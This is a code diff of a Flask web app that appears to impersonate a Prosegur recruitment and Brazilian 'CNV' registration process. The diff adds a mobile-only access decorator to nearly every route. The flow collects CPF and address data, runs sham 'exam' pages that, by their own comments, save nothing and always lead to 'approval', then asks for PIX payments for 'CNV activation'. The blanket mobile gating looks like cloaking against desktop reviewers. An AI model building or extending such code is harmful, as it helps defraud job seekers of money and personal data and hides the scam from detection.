@@ -533,11 +533,12 @@ def create_shipping_payment():
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route("/info")
+@mobile_only_enhanced
 def info():
     return render_template("info.html")
 
 @app.route("/submit_registration", methods=["POST"])
-@simple_mobile_only
+@mobile_only_enhanced
 def submit_registration():
     try:
         data = request.form
@@ -565,6 +566,7 @@ def submit_registration():
         return jsonify({"success": False, "error": str(e)})
 
 @app.route("/exame")
+@mobile_only_enhanced
 @performance_monitor
 def exame():
     if not session.get('registration_data'):
@@ -576,6 +578,7 @@ def exame():
     return render_template("exame.html")
 
 @app.route("/submit_exam", methods=["POST"])
+@mobile_only_enhanced
 @performance_monitor
 def submit_exam():
     # Exam forms do not save or submit any data - just proceed to next step
@@ -588,6 +591,7 @@ def submit_exam():
     })
 
 @app.route("/psicotecnico")
+@mobile_only_enhanced
 @performance_monitor
 def psicotecnico():
     if not session.get('registration_data'):
@@ -599,6 +603,7 @@ def psicotecnico():
     return render_template("psicotecnico.html")
 
 @app.route("/submit_psicotecnico", methods=["POST"])
+@mobile_only_enhanced
 @performance_monitor
 def submit_psicotecnico():
     # Psychotechnical forms do not save or submit any data - just proceed to approval
@@ -611,6 +616,7 @@ def submit_psicotecnico():
     })
 
 @app.route("/aprovado")
+@mobile_only_enhanced
 def aprovado():
     if not session.get('registration_data'):
         return redirect(url_for('loading', 
@@ -620,6 +626,7 @@ def aprovado():
     return render_template("aprovado.html")
 
 @app.route("/process_payment", methods=["POST"])
+@mobile_only_enhanced
 def process_payment():
     """Display loading page and process PIX payment"""
     # Store form data in session for payment processing
@@ -637,6 +644,7 @@ def process_payment():
         time=3000))
 
 @app.route("/create_pix_payment", methods=["GET", "POST"])
+@mobile_only_enhanced
 def create_pix_payment():
     """Create PIX payment and redirect to payment page"""
     try:
@@ -954,12 +962,12 @@ def resultado(status):
                           now=current_date)
 
 @app.route("/agendamento")
-@simple_mobile_only
+@mobile_only_enhanced
 def agendamento():
     return render_template("agendamento.html")
 
 @app.route("/chat")
-@simple_mobile_only
+@mobile_only_enhanced
 def chat():
     """Chat page for candidate interactions with Prosegur HR"""
     # Get user data from session
@@ -974,6 +982,7 @@ def chat():
                          cpf=user_cpf)
 
 @app.route("/get_training_location")
+@mobile_only_enhanced
 def get_training_location():
     try:
         # Get user's city from session (saved from address form)
@@ -1024,6 +1033,7 @@ def get_training_location():
         app.logger.error(f"Erro na rota get_training_location: {str(e)}")
 
 @app.route('/get_medical_clinic', methods=['POST'])
+@mobile_only_enhanced
 def get_medical_clinic():
     """Get medical clinic location for user using OpenAI"""
     try:
@@ -1081,6 +1091,7 @@ def get_medical_clinic():
         })
 
 @app.route("/api/search-cras-units", methods=["POST"])
+@mobile_only_enhanced
 def search_cras_units():
     """Search the 4 closest CRAS units using OpenAI based on user's CEP and location"""
     try:
@@ -1135,6 +1146,7 @@ def search_cras_units():
         }), 500
 
 @app.route("/admin/load-cras-data")
+@mobile_only_enhanced
 def load_cras_data():
     """Endpoint administrativo para carregar dados CRAS usando OpenAI"""
     try:
@@ -1157,6 +1169,7 @@ def load_cras_data():
         }), 500
 
 @app.route("/agendamento", methods=["POST"])
+@mobile_only_enhanced
 def submit_agendamento():
     try:
         training_date = request.form.get('training_date')
@@ -1192,6 +1205,7 @@ def submit_agendamento():
         }), 500
 
 @app.route("/health")
+@mobile_only_enhanced
 def health_check():
     """Health check endpoint for monitoring"""
     try:
@@ -1230,11 +1244,13 @@ def health_check():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route("/painel")
+@mobile_only_enhanced
 def painel():
     """Analytics dashboard for real-time monitoring"""
     return render_template("painel.html")
 
 @app.route("/api/analytics")
+@mobile_only_enhanced
 def api_analytics():
     """API endpoint for real-time analytics data from database"""
     try:
@@ -1254,18 +1270,19 @@ def api_analytics():
         return jsonify({"error": "Failed to get analytics data"}), 500
 
 @app.route('/login')
-@simple_mobile_only
+@mobile_only_enhanced
 def login():
     """Login page for CNAS activation"""
     return render_template("login.html")
 
 @app.route('/share')
+@mobile_only_enhanced
 def share():
     """Share page for referral program"""
     return render_template("share.html")
 
 @app.route('/aviso')
-@simple_mobile_only
+@mobile_only_enhanced
 def aviso():
     """CNV Digital page"""
     # Get pixel IDs for template
@@ -1279,12 +1296,13 @@ def aviso():
                          pixel_event_data=pixel_event_data)
 
 @app.route('/finalizar')
-@simple_mobile_only
+@mobile_only_enhanced
 def finalizar():
     """CNV Payment page with real PIX transaction"""
     return render_template('finalizar.html')
 
 @app.route('/create_cnv_payment', methods=['POST'])
+@mobile_only_enhanced
 def create_cnv_payment():
     """Create PIX payment for CNV activation"""
     try:
